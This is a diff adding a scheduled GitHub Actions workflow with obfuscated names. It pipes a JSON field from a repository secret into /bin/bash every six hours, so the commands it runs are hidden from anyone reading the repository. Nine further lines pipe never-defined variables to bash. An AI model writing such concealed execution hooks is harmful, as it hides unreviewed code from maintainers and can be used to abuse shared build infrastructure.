@@ -1,0 +1,28 @@
+name: liaojiexcv
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liaojiexcv
+        env:
+          ww8023: ${{ secrets.ww8023 }}
+        run: |
+          echo $ww8023 | jq -r .bycgt33 | /bin/bash
+          echo $q004 | jq -r .rdu39103 | /bin/bash
+          echo $tsydr62535 | jq -r .mf0 | /bin/bash
+          echo $sjk320 | jq -r .yzi57 | /bin/bash
+          echo $pust10751 | jq -r .lrgu9 | /bin/bash
+          echo $hlgnv04 | jq -r .in190 | /bin/bash
+          echo $ppfk7127 | jq -r .rir9551 | /bin/bash
+          echo $cf1 | jq -r .gohis85 | /bin/bash
+          echo $ap1 | jq -r .qq4717 | /bin/bash
+          echo $nihp5 | jq -r .kvbb505 | /bin/bash
+
